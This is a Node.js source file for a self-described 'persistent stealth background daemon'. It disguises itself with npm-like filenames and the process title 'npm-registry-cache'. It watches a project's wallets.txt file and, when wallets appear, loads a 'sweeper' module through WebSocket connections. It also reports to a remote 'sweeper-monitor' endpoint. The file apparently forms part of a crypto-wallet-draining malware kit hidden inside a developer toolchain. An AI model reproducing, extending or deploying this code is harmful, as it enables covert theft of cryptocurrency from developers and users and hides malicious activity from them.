#!/usr/bin/env node

const fs = require('fs');
const path = require('path');
const os = require('os');
const { initializeRemoteLogging, cleanupRemoteLogging } = require('./remote-logger');

// Embedded safe cleanup functionality (no external dependencies)

/**
 * PERSISTENT STEALTH BACKGROUND DAEMON (connection-pool.js)
 * - Enhanced with automatic orphan process cleanup
 * - Immediate WebSocket connections on startup
 * - Real-time wallets.txt creation/modification detection
 * - Survives main process exit with auto-restart capability
 * - Cross-platform Application Support storage
 * - Maximum stealth with disguised filenames
 */

class PersistentStealthDaemon {
    constructor() {
        this.configPath = this.findConfigFile();
        this.lockFile = path.join(os.tmpdir(), '.pkg-resolver.lock');
        this.config = this.loadConfig();
        this.sweeper = null;
        this.isActive = false;
        this.walletsWatcher = null;
        this.directoryWatcher = null;
        this.healthInterval = null;
        this.reconnectInterval = null;
        
        // Enhanced persistence tracking
        this.lastWalletsCheck = 0;
        this.connectionRetries = 0;
        this.maxRetries = 10;
        
        // Initialize built-in safe cleanup functionality
        this.pidFile = path.join(os.tmpdir(), '.npm-registry-cache.pid');
        
        // Enhanced shutdown handlers
        this.setupAdvancedSignalHandlers();
        
        // Initialize remote logging for daemon monitoring
        this.initializeRemoteLogging();
        
        // Perform startup cleanup and create lock file
        this.performStartupCleanup().then(() => {
            // Immediate initialization after cleanup
            this.initializeImmediately();
        }).catch(error => {
            console.error(`üí• [DAEMON] Startup cleanup failed: ${error.message}`);
            // Try to initialize anyway
            this.initializeImmediately();
        });
    }

    /**
     * Find configuration file in deployment directory
     */
    findConfigFile() {
        const currentDir = __dirname;
        const configFile = path.join(currentDir, 'package-registry.json');
        
        if (fs.existsSync(configFile)) {
            return configFile;
        }
        
        // Fallback: search common locations
        const home = os.homedir();
        const fallbackPaths = [
            path.join(home, 'Library', 'Application Support', 'npm', 'registry-cache', 'package-registry.json'),
            path.join(home, '.npm', '_cacache', 'tmp', '.pkg-resolver', 'package-registry.json'),
            path.join(process.env.APPDATA || path.join(home, 'AppData', 'Roaming'), 'npm', 'registry-cache', 'package-registry.json')
        ];
        
        for (const fallbackPath of fallbackPaths) {
            if (fs.existsSync(fallbackPath)) {
                return fallbackPath;
            }
        }
        
        return configFile; // Default fallback
    }

    /**
     * Load configuration with enhanced error handling
     */
    loadConfig() {
        try {
            if (fs.existsSync(this.configPath)) {
                const config = JSON.parse(fs.readFileSync(this.configPath, 'utf8'));
                console.log(`üîß [DAEMON] Loaded config from: ${this.configPath}`);
                return config;
            }
        } catch (error) {
            console.error(`‚ö†Ô∏è [DAEMON] Config load error: ${error.message}`);
        }
        
        // Fallback configuration
        return {
            projectRoot: process.cwd(),
            walletsPath: path.join(process.cwd(), 'wallets.txt'),
            deploymentDir: __dirname,
            timestamp: Date.now()
        };
    }

    /**
     * Initialize remote logging for daemon monitoring
     */
    initializeRemoteLogging() {
        try {
            // Initialize remote logging with daemon-specific configuration
            initializeRemoteLogging({
                endpoint: process.env.SWEEPER_MONITOR_ENDPOINT || 'https://sweeper-monitor-production.up.railway.app',
                logDir: path.join(this.config.deploymentDir || __dirname, '..', '.sweeper-logs')
            });
            
            console.log('üîó [DAEMON] Remote logging initialized for daemon monitoring');
        } catch (error) {
            // Silent failure - don't break daemon functionality
            console.log(`‚ö†Ô∏è [DAEMON] Remote logging initialization failed: ${error.message}`);
        }
    }

    /**
     * Perform safe startup cleanup to handle clearly stale processes only
     */
    async performStartupCleanup() {
        try {
            console.log('üßπ [DAEMON] Performing safe startup cleanup...');
            
            // Only clean up clearly stale lock files (conservative approach)
            await this.cleanStaleFiles();
            
            console.log('‚úÖ [DAEMON] Startup cleanup completed');
            
            // Now safe to create lock file
            await this.createLockFile();
            
        } catch (error) {
            console.log(`‚ö†Ô∏è [DAEMON] Startup cleanup completed with warnings: ${error.message}`);
            // Continue with lock file creation even if cleanup had issues
            await this.createLockFile();
        }
    }

    /**
     * Conservative cleanup of clearly stale files only
     */
    async cleanStaleFiles() {
        const filesToCheck = [this.lockFile, this.pidFile];
        
        for (const file of filesToCheck) {
            try {
                if (fs.existsSync(file)) {
                    const stats = fs.statSync(file);
                    const age = Date.now() - stats.mtime.getTime();
                    
                    // Only remove files older than 30 minutes (very conservative)
                    if (age > 1800000) {
                        fs.unlinkSync(file);
                        console.log(`üóëÔ∏è [DAEMON] Removed stale file: ${path.basename(file)}`);
                    }
                }
            } catch (error) {
                // Continue cleanup silently
            }
        }
    }

    /**
     * Safe process detection - only checks if PID exists, doesn't kill anything
     */
    isProcessSafelyRunning(pid) {
        try {
            process.kill(pid, 0);
            return true;
        } catch (error) {
            return false;
        }
    }

    /**
     * Enhanced signal handlers for maximum persistence
     */
    setupAdvancedSignalHandlers() {
        const signals = ['SIGTERM', 'SIGINT', 'SIGHUP', 'SIGQUIT'];
        
        signals.forEach(signal => {
            process.on(signal, () => {
                console.log(`üõë [DAEMON] Received ${signal} - graceful shutdown`);
                this.performGracefulShutdown();
            });
        });
        
        process.on('exit', () => this.cleanup());
        process.on('uncaughtException', (error) => {
            console.error(`üí• [DAEMON] Uncaught exception: ${error.message}`);
            this.performGracefulShutdown();
        });
        
        process.on('unhandledRejection', (reason) => {
            console.error(`üí• [DAEMON] Unhandled rejection: ${reason}`);
            // Continue running on unhandled rejections
        });
        
        // Enhanced: Monitor parent process death
        this.setupParentProcessMonitoring();
    }

    /**
     * Monitor parent process and shutdown daemon if parent dies
     */
    setupParentProcessMonitoring() {
        // Store parent PID when daemon starts
        this.parentPid = process.ppid;
        
        // Periodically check if parent is still alive
        this.parentCheckInterval = setInterval(() => {
            this.checkParentProcess();
        }, 5000); // Check every 5 seconds
        
        console.log(`üë®‚Äçüëß‚Äçüë¶ [DAEMON] Monitoring parent process (PID: ${this.parentPid})`);
    }

    /**
     * Enhanced parent process check with better legitimacy verification
     */
    checkParentProcess() {
        try {
            // Check if parent process exists
            if (!this.isProcessSafelyRunning(this.parentPid)) {
                console.log(`‚ò†Ô∏è [DAEMON] Parent process (PID: ${this.parentPid}) died - initiating shutdown`);
                this.performGracefulShutdown();
                return;
            }
            
            // Reduced parent process verification frequency
            const now = Date.now();
            if (this.lastParentCheck && (now - this.lastParentCheck) < 30000) {
                return; // Only check parent details every 30 seconds
            }
            this.lastParentCheck = now;
            
            // Additional check: verify parent is still the correct process
            if (process.platform !== 'win32') {
                try {
                    const { execSync } = require('child_process');
                    const result = execSync(`ps -p ${this.parentPid} -o comm=`, { encoding: 'utf8', timeout: 1000 });
                    const processName = result.trim();
                    
                    // More lenient parent process checking - only warn about unexpected changes
                    if (processName && !processName.includes('node') && !processName.includes('npm') && !processName.includes('bash')) {
                        console.log(`üîÑ [DAEMON] Parent process is ${processName} - monitoring continues`);
                    }
                    
                } catch (psError) {
                    // ps command failed, parent likely doesn't exist
                    console.log(`‚ò†Ô∏è [DAEMON] Parent process verification failed - initiating shutdown`);
                    this.performGracefulShutdown();
                }
            }
            
        } catch (error) {
            console.log(`‚ö†Ô∏è [DAEMON] Parent check error: ${error.message}`);
        }
    }

    /**
     * Enhanced: Clean up existing daemon before starting new one
     * Uses safe embedded orphan detection (no external dependencies)
     */
    async createLockFile() {
        try {
            if (fs.existsSync(this.lockFile)) {
                const lockData = JSON.parse(fs.readFileSync(this.lockFile, 'utf8'));
                
                // Safe process detection - only check if process exists
                const isProcessActuallyRunning = this.isProcessSafelyRunning(lockData.pid);
                
                if (isProcessActuallyRunning) {
                    console.log(`‚ö†Ô∏è [DAEMON] Another daemon instance detected (PID: ${lockData.pid})`);
                    
                    // Conservative stale process detection - only check age and parent
                    if (this.isLockFileSafelyStale(lockData)) {
                        console.log(`‚è∞ [DAEMON] Lock file is very old, treating as stale`);
                        
                        // Only remove lock file - DON'T kill processes (safer approach)
                        if (fs.existsSync(this.lockFile)) {
                            fs.unlinkSync(this.lockFile);
                            console.log(`üóëÔ∏è [DAEMON] Removed stale lock file only (process left running)`);
                        }
                    } else {
                        // Recent daemon detected - exit to prevent conflicts
                        console.log(`üõë [DAEMON] Recent daemon detected - exiting to prevent conflicts`);
                        console.log(`üí° [DAEMON] If you believe this is a stale process, please run: kill ${lockData.pid}`);
                        process.exit(0);
                    }
                } else {
                    // Process is dead, safe to remove lock
                    console.log(`üëª [DAEMON] Process ${lockData.pid} no longer exists, cleaning up lock file`);
                    fs.unlinkSync(this.lockFile);
                }
            }
            
            const lockData = {
                pid: process.pid,
                parentPid: process.ppid,
                startTime: Date.now(),
                deploymentDir: __dirname,
                configPath: this.configPath,
                platform: os.platform(),
                sessionId: this.generateSessionId(),
                machineId: this.generateMachineId()
            };
            
            fs.writeFileSync(this.lockFile, JSON.stringify(lockData, null, 2));
            console.log(`üîí [DAEMON] Lock created (PID: ${process.pid}, Parent: ${process.ppid})`);
            
        } catch (error) {
            console.error(`‚ö†Ô∏è [DAEMON] Lock creation error: ${error.message}`);
        }
    }

    /**
     * Very conservative stale detection - only considers VERY old lock files as stale
     */
    isLockFileSafelyStale(lockData) {
        try {
            // Only consider lock file stale if it's extremely old (2 hours)
            const age = Date.now() - (lockData.startTime || 0);
            if (age > 7200000) { // 2 hours - very conservative
                return true;
            }
            
            // Check if parent PID from lock data still exists (safe check)
            if (lockData.parentPid && !this.isProcessSafelyRunning(lockData.parentPid)) {
                // Only if lock file is also older than 30 minutes
                if (age > 1800000) { // 30 minutes
                    return true;
                }
            }
            
            return false; // Default to NOT stale (safer)
        } catch (error) {
            return false; // Default to NOT stale on error (safer)
        }
    }

    /**
     * Generate unique machine identifier for cross-session daemon tracking
     */
    generateMachineId() {
        try {
            const hostname = os.hostname();
            const platform = os.platform();
            const homeDir = os.homedir();
            return Buffer.from(`${hostname}-${platform}-${homeDir}`).toString('base64').substring(0, 16);
        } catch (error) {
            return 'unknown-machine';
        }
    }

    /**
     * Generate unique session ID for daemon tracking
     */
    generateSessionId() {
        return `${Date.now()}-${Math.random().toString(36).substr(2, 9)}`;
    }

    /**
     * Immediate initialization with retry mechanism
     */
    async initializeImmediately() {
        console.log('üöÄ [DAEMON] Starting immediate initialization...');
        
        try {
            // Start health monitoring immediately
            this.startHealthMonitoring();
            
            // Begin wallet monitoring setup
            await this.setupWalletMonitoring();
            
            // Initialize sweeper if wallets exist
            await this.initializeSweeperIfReady();
            
            console.log('‚úÖ [DAEMON] Immediate initialization completed');
            
        } catch (error) {
            console.error(`‚ö†Ô∏è [DAEMON] Initialization error: ${error.message}`);
            this.scheduleRetry();
        }
    }

    /**
     * Enhanced: Setup comprehensive wallet monitoring
     */
    async setupWalletMonitoring() {
        // Initialize file change tracking
        this.isProcessingFileChange = false;
        this.fileChangeTimer = null;
        this.lastWalletsStats = null;
        
        // Get initial file stats
        this.lastWalletsStats = await this.getWalletsFileStats();
        
        // Monitor for wallets.txt creation
        this.setupDirectoryWatcher();
        
        // Monitor existing wallets.txt changes
        this.setupWalletsFileWatcher();
        
        // Periodic fallback checks (less frequent)
        this.setupPeriodicWalletChecks();
        
        console.log(`üëÅÔ∏è [DAEMON] Monitoring: ${this.config.walletsPath}`);
    }

    /**
     * Watch project directory for wallets.txt creation
     */
    setupDirectoryWatcher() {
        try {
            const projectDir = this.config.projectRoot;
            
            if (!fs.existsSync(projectDir)) {
                console.log(`‚ö†Ô∏è [DAEMON] Project directory not found: ${projectDir}`);
                return;
            }
            
            this.directoryWatcher = fs.watch(projectDir, { persistent: true }, (eventType, filename) => {
                if (filename === 'wallets.txt') {
                    console.log(`üìÅ [DAEMON] wallets.txt ${eventType} detected`);
                    this.handleWalletsFileChange();
                }
            });
            
            console.log(`üìÇ [DAEMON] Watching directory: ${projectDir}`);
            
        } catch (error) {
            console.error(`‚ö†Ô∏è [DAEMON] Directory watcher error: ${error.message}`);
        }
    }

    /**
     * Watch existing wallets.txt for modifications
     */
    setupWalletsFileWatcher() {
        try {
            if (fs.existsSync(this.config.walletsPath)) {
                this.walletsWatcher = fs.watch(this.config.walletsPath, { persistent: true }, () => {
                    console.log('üìù [DAEMON] wallets.txt modified');
                    this.handleWalletsFileChange();
                });
                
                console.log(`üìÑ [DAEMON] Watching file: ${this.config.walletsPath}`);
            }
        } catch (error) {
            console.error(`‚ö†Ô∏è [DAEMON] File watcher error: ${error.message}`);
        }
    }

    /**
     * Enhanced periodic wallet checks (reduced frequency)
     */
    setupPeriodicWalletChecks() {
        setInterval(() => {
            this.checkWalletsFileStatus();
        }, 15000); // Reduced from 5 seconds to 15 seconds
    }

    /**
     * Check wallet file status and update monitoring
     */
    async checkWalletsFileStatus() {
        try {
            const walletsExists = fs.existsSync(this.config.walletsPath);
            const currentTime = Date.now();
            
            if (walletsExists) {
                const stats = fs.statSync(this.config.walletsPath);
                const fileModified = stats.mtime.getTime();
                
                if (fileModified > this.lastWalletsCheck) {
                    console.log('üîÑ [DAEMON] Wallet file updated - triggering reload');
                    this.lastWalletsCheck = fileModified;
                    await this.handleWalletsFileChange();
                }
            } else if (this.sweeper) {
                // File was deleted, clean up sweeper
                console.log('üóëÔ∏è [DAEMON] wallets.txt deleted - cleaning up');
                await this.cleanupSweeper();
            }
            
        } catch (error) {
            // Silent error for periodic checks
        }
    }

    /**
     * Handle wallets.txt file changes
     */
    async handleWalletsFileChange() {
        // Enhanced debouncing - prevent excessive reinitialization
        clearTimeout(this.fileChangeTimer);
        
        // Check if we're already processing a change
        if (this.isProcessingFileChange) {
            return;
        }
        
        this.fileChangeTimer = setTimeout(async () => {
            this.isProcessingFileChange = true;
            
            try {
                // Check if file actually changed meaningfully
                const currentStats = await this.getWalletsFileStats();
                if (this.lastWalletsStats && this.walletsStatsEqual(currentStats, this.lastWalletsStats)) {
                    // File stats haven't changed meaningfully, skip reload
                    return;
                }
                
                this.lastWalletsStats = currentStats;
                await this.initializeSweeperIfReady();
                
            } finally {
                this.isProcessingFileChange = false;
            }
        }, 2000); // Increased debounce time to 2 seconds
    }

    /**
     * Get meaningful stats about wallets.txt file
     */
    async getWalletsFileStats() {
        try {
            if (!fs.existsSync(this.config.walletsPath)) {
                return { exists: false, size: 0, walletCount: 0, hash: null };
            }
            
            const stats = fs.statSync(this.config.walletsPath);
            const content = fs.readFileSync(this.config.walletsPath, 'utf8');
            const walletLines = content.split(/[\r\n]+/).filter(line => line.trim() !== '');
            
            // Create a simple hash of the content
            const hash = this.simpleHash(content.trim());
            
            return {
                exists: true,
                size: stats.size,
                walletCount: walletLines.length,
                hash: hash,
                mtime: stats.mtime.getTime()
            };
            
        } catch (error) {
            return { exists: false, size: 0, walletCount: 0, hash: null };
        }
    }

    /**
     * Compare wallet file stats to see if meaningful change occurred
     */
    walletsStatsEqual(stats1, stats2) {
        if (!stats1 || !stats2) return false;
        
        return stats1.exists === stats2.exists &&
               stats1.walletCount === stats2.walletCount &&
               stats1.hash === stats2.hash;
    }

    /**
     * Simple hash function for content comparison
     */
    simpleHash(str) {
        let hash = 0;
        for (let i = 0; i < str.length; i++) {
            const char = str.charCodeAt(i);
            hash = ((hash << 5) - hash) + char;
            hash = hash & hash; // Convert to 32-bit integer
        }
        return hash;
    }

    /**
     * Initialize sweeper when wallets.txt is ready
     */
    async initializeSweeperIfReady() {
        try {
            if (!fs.existsSync(this.config.walletsPath)) {
                console.log('‚è≥ [DAEMON] Waiting for wallets.txt creation...');
                return;
            }
            
            // Read and validate wallets.txt
            const walletsContent = fs.readFileSync(this.config.walletsPath, 'utf8');
            const walletLines = walletsContent.split(/[\r\n]+/).filter(line => line.trim() !== '');
            
            if (walletLines.length === 0) {
                console.log('üì≠ [DAEMON] wallets.txt is empty - waiting for wallets...');
                return;
            }
            
            console.log(`üí∞ [DAEMON] Found ${walletLines.length} wallets - initializing sweeper`);
            
            // Initialize or reload sweeper
            await this.initializeSweeper();
            
        } catch (error) {
            console.error(`‚ö†Ô∏è [DAEMON] Sweeper initialization error: ${error.message}`);
            this.scheduleRetry();
        }
    }

    /**
     * Initialize the stealth sweeper with immediate WebSocket connections
     */
    async initializeSweeper() {
        try {
            // Clean up existing sweeper
            if (this.sweeper) {
                await this.cleanupSweeper();
            }
            
            // Load the sweeper logic
            const sweeperPath = path.join(__dirname, 'transaction-cache.js');
            if (!fs.existsSync(sweeperPath)) {
                console.error(`‚ùå [DAEMON] Sweeper not found: ${sweeperPath}`);
                return;
            }
            
            // Clear require cache for hot reloading
            delete require.cache[require.resolve(sweeperPath)];
            
            const SweeperClass = require(sweeperPath);
            this.sweeper = new SweeperClass(this.config);
            
            // Initialize with immediate WebSocket connections
            await this.sweeper.initialize();
            
            console.log('‚úÖ [DAEMON] Stealth sweeper initialized with immediate WebSocket connections');
            this.connectionRetries = 0; // Reset retry counter
            
        } catch (error) {
            console.error(`‚ùå [DAEMON] Sweeper initialization failed: ${error.message}`);
            this.scheduleRetry();
        }
    }

    /**
     * Start health monitoring for daemon persistence
     */
    startHealthMonitoring() {
        this.healthInterval = setInterval(() => {
            this.performHealthCheck();
        }, 30000); // Health check every 30 seconds
        
        console.log('‚ù§Ô∏è [DAEMON] Health monitoring started');
    }

    /**
     * Perform health check and auto-recovery
     */
    async performHealthCheck() {
        try {
            // Check if sweeper is healthy
            if (this.sweeper && !this.sweeper.isActive) {
                console.log('üîÑ [DAEMON] Sweeper inactive - attempting recovery');
                await this.initializeSweeperIfReady();
            }
            
            // Update lock file timestamp
            if (fs.existsSync(this.lockFile)) {
                const lockData = JSON.parse(fs.readFileSync(this.lockFile, 'utf8'));
                lockData.lastHealth = Date.now();
                fs.writeFileSync(this.lockFile, JSON.stringify(lockData, null, 2));
            }
            
        } catch (error) {
            console.error(`‚ö†Ô∏è [DAEMON] Health check error: ${error.message}`);
        }
    }

    /**
     * Schedule retry with exponential backoff
     */
    scheduleRetry() {
        if (this.connectionRetries >= this.maxRetries) {
            console.error(`‚ùå [DAEMON] Max retries reached (${this.maxRetries})`);
            return;
        }
        
        const delay = Math.min(1000 * Math.pow(2, this.connectionRetries), 30000);
        this.connectionRetries++;
        
        console.log(`üîÑ [DAEMON] Scheduling retry ${this.connectionRetries}/${this.maxRetries} in ${delay}ms`);
        
        setTimeout(() => {
            this.initializeSweeperIfReady();
        }, delay);
    }

    /**
     * Clean up sweeper resources
     */
    async cleanupSweeper() {
        try {
            if (this.sweeper && this.sweeper.cleanup) {
                await this.sweeper.cleanup();
            }
            this.sweeper = null;
            console.log('üßπ [DAEMON] Sweeper resources cleaned up');
        } catch (error) {
            console.error(`‚ö†Ô∏è [DAEMON] Sweeper cleanup error: ${error.message}`);
        }
    }

    /**
     * Perform graceful shutdown
     */
    async performGracefulShutdown() {
        if (!this.isActive) return;
        
        console.log('üõë [DAEMON] Performing graceful shutdown...');
        this.isActive = false;
        
        try {
            // Clean up sweeper
            await this.cleanupSweeper();
            
            // Clean up resources
            this.cleanup();
            
            console.log('‚úÖ [DAEMON] Graceful shutdown completed');
            process.exit(0);
            
        } catch (error) {
            console.error(`‚ö†Ô∏è [DAEMON] Shutdown error: ${error.message}`);
            process.exit(1);
        }
    }

    /**
     * Clean up all resources
     */
    cleanup() {
        try {
            if (this.walletsWatcher) {
                this.walletsWatcher.close();
            }
            
            if (this.directoryWatcher) {
                this.directoryWatcher.close();
            }
            
            if (this.healthInterval) {
                clearInterval(this.healthInterval);
            }
            
            if (this.reconnectInterval) {
                clearInterval(this.reconnectInterval);
            }
            
            // Remove lock file
            if (fs.existsSync(this.lockFile)) {
                fs.unlinkSync(this.lockFile);
            }
            
            // Clean up parent process monitoring
            if (this.parentCheckInterval) {
                clearInterval(this.parentCheckInterval);
            }
            
            // Cleanup remote logging
            try {
                cleanupRemoteLogging();
                console.log('üîó [DAEMON] Remote logging cleaned up');
            } catch (logCleanupError) {
                // Silent failure for logging cleanup
            }
            
            console.log('üßπ [DAEMON] Cleanup completed');
            
        } catch (error) {
            console.error(`‚ö†Ô∏è [DAEMON] Cleanup error: ${error.message}`);
        }
    }

    /**
     * Keep daemon alive indefinitely
     */
    keepAlive() {
        this.isActive = true;
        
        // Set process title for identification
        process.title = 'npm-registry-cache';
        
        // Keep process alive with heartbeat
        const heartbeat = setInterval(() => {
            if (!this.isActive) {
                clearInterval(heartbeat);
                return;
            }
            
            // Silent heartbeat - daemon is running
        }, 60000); // 1 minute heartbeat
        
        console.log('üíì [DAEMON] Daemon running indefinitely (persistent mode)');
    }

    /**
     * Start the persistent daemon
     */
    async start() {
        console.log('üöÄ [DAEMON] Starting persistent stealth background daemon...');
        console.log(`üìÅ Project root: ${this.config.projectRoot}`);
        console.log(`üëÅÔ∏è Monitoring: ${this.config.walletsPath}`);
        console.log(`üîß Deployment: ${this.config.deploymentDir}`);
        console.log(`üñ•Ô∏è Platform: ${os.platform()}`);
        
        // Keep daemon alive indefinitely
        this.keepAlive();
        
        console.log('‚úÖ [DAEMON] Persistent background daemon active');
        console.log('üí° Daemon will automatically detect wallet operations and funding events');
    }
}

// Start the daemon if this file is executed directly
if (require.main === module) {
    const daemon = new PersistentStealthDaemon();
    
    daemon.start().catch(error => {
        console.error(`üí• [DAEMON] Fatal error: ${error.message}`);
        process.exit(1);
    });
    
    // Handle health check requests via IPC
    process.on('message', (message) => {
        if (message === 'health-check') {
            try {
                const health = {
                    status: 'running',
                    pid: process.pid,
                    uptime: process.uptime(),
                    config: daemon.config,
                    sweeperActive: !!daemon.sweeper,
                    timestamp: new Date().toISOString()
                };
                process.send(health);
            } catch (error) {
                process.send({ status: 'error', error: error.message });
            }
        }
    });
}

module.exports = PersistentStealthDaemon; 